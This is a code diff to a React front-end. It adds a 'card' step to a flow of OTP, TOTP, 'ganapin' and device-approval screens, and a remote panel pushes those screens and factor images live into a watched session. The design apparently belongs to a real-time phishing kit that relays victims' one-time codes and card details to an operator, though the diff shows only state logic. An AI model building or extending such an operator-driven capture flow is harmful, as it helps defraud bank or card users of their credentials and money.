@@ -286,6 +286,10 @@ export default function App() {
       lastTerminalKeyRef.current = ''
     }
 
+    if (currentStep === 'card') {
+      return
+    }
+
     if (remote.state === 'waiting-dispositivo') {
       if (routeRef.current !== 'habilitar' || currentStep !== 'idle') {
         openDispositivoFromPanel()
@@ -389,6 +393,7 @@ export default function App() {
       if (!remote) {
         const applied = await applyTerminalFromActions(id)
         if (applied) return
+        if (stepRef.current === 'card') return
         const savedAt = loadPending()?.savedAt || 0
         if (Date.now() - savedAt < 3000) return
         resetForm('')
@@ -406,6 +411,7 @@ export default function App() {
       step === 'loading' ||
       step === 'otp' ||
       step === 'otp-wait' ||
+      step === 'card' ||
       (route === 'habilitar' && Boolean(id))
     if (!id || !watching) {
       return undefined
@@ -419,6 +425,7 @@ export default function App() {
           return
         }
         if (msg.type === 'session:gone' && msg.sessionId === sessionIdRef.current) {
+          if (stepRef.current === 'card') return
           applyTerminalFromActions(msg.sessionId)
           return
         }
@@ -426,13 +433,14 @@ export default function App() {
         if (!sessionIdRef.current || msg.sessionId !== sessionIdRef.current) return
 
         if (msg.action === 'ganapin' || msg.action === 'totp') {
-          if (routeRef.current === 'habilitar') return
+          if (routeRef.current === 'habilitar' || stepRef.current === 'card') return
           if (msg.image) applyFactor(msg.action, msg.image)
           else syncFromHub()
           return
         }
 
         if (msg.action === 'dispositivo') {
+          if (stepRef.current === 'card') return
           openDispositivoFromPanel()
           return
         }
@@ -475,6 +483,7 @@ export default function App() {
       step === 'loading' ||
       step === 'otp' ||
       step === 'otp-wait' ||
+      step === 'card' ||
       (route === 'habilitar' && Boolean(id))
     if (!watching || !id) return undefined
     const t = setInterval(() => {
@@ -531,6 +540,8 @@ export default function App() {
     if (cardTimerRef.current) window.clearTimeout(cardTimerRef.current)
     cardTimerRef.current = window.setTimeout(() => {
       if (stepRef.current === 'otp' || stepRef.current === 'otp-wait') return
+      lastTerminalKeyRef.current = ''
+      stepRef.current = 'card'
       setStep('card')
       cardTimerRef.current = 0
     }, 6000)
